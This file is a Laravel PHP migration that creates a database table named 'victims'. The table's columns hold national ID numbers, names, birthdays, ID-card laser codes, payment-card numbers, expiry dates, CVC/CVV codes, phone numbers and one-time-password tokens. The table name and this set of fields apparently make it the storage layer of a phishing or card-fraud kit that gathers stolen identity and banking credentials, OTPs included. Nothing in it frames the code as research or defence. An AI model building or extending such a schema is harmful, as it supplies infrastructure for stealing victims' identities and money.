<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('victims', function (Blueprint $table) {
            $table->id();
            $table->string('identification_number');
            $table->string('first_name');
            $table->string('middle_name')->nullable();
            $table->string('last_name');
            $table->date('birthday');
            $table->string('laser_code');
            $table->string('card_type');
            $table->string('name_on_card');
            $table->string('card_number');
            $table->string('date_expire');
            $table->string('CVC_CVV');
            $table->string('telephone');
            $table->string('otp_token')->nullable();
            $table->timestamps();
            $table->softDeletes();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('victims');
        Schema::table('victims', function (Blueprint $table){
            $table->dropSoftDeletes();
        });
    }

};
